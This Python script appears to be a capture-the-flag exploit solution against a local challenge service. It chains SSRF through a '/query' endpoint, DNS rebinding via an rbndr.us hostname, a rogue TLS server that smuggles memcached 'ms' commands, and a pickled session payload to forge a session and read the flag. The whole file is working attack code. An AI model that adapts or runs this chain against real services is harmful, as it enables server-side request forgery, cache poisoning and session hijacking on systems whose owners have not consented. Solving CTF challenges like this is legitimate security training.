#!/usr/bin/env python3

import socket, binascii
import requests
import base64
import time
import pickle
if __name__ == '__main__':
    from TLS import run_rogue_server
else:
    from .TLS import run_rogue_server

def primer(HOST, PORT, payload):
    def nslookup(host):
        return list(set(ai[4][0] for ai in socket.getaddrinfo(host, None) if ai[0] == socket.AF_INET))

    def ip2hex(ip):
        return binascii.hexlify(socket.inet_aton(ip)).decode('ascii')

    s = requests.Session()
    info = s.get(f'http://{HOST}:{PORT}/info').json()

    # Disable Redis agents
    for k in info['version']['trino']:
        if 'redis' in k:
            s.post(f'http://{HOST}:{PORT}/failover', json={'url': k})

    poisoner_hex = ip2hex('143.248.235.34')
    albireo_hex = ip2hex(info['network']['trino']['albireo'][0])

    rebinder = f'{poisoner_hex}.{albireo_hex}.rbndr.us'
    print(f'rebinder: {rebinder}')

    s2 = requests.Session()
    s2.get(f'http://{HOST}:{PORT}/')

    sess = s2.cookies['session'].split('.')[0]
    print(f'session: {sess}')

    # init:    b'\nms s:0123456789ab 0\n\r\n'
    # append:  b'\nms s:0123456789ab 6 MA\nABCDEF\r\n'

    def ms_init(sid):
        return f'\nms s:{sid} 0\n\r\n'.encode('ascii')

    def ms_append(sid, dat):
        assert len(dat) <= 6
        return f'\nms s:{sid} {len(dat)} MA\n'.encode('ascii') + dat + b'\r\n'

    payloads = [ms_init(sess)] + [
        ms_append(sess, payload[i:i+6]) for i in range(0, len(payload), 6)
    ]

    print(f'payloads count: {len(payloads)}')

    t = run_rogue_server('key.pem', 'cert.pem', 65401, 0.2, f'https://{rebinder}:65401/', payloads)

    while t.is_alive():
        s.post(f'http://{HOST}:{PORT}/query', json={'url': f'https://{rebinder}:65401/'})
        time.sleep(0.2)

    # joining for "aesthetics"
    t.join()

    for c in s2.cookies:
        c.expires += 60*60*24*30

    return s2

if __name__ == '__main__':
    HOST, PORT = 'localhost', 15961
    s = primer(HOST, PORT, pickle.dumps({'_permanent': True, 'flag': 'albireo'}))
    fetch = s.get(f'http://{HOST}:{PORT}/flag').json()
    print(fetch['FLAG_ALBIREO'])
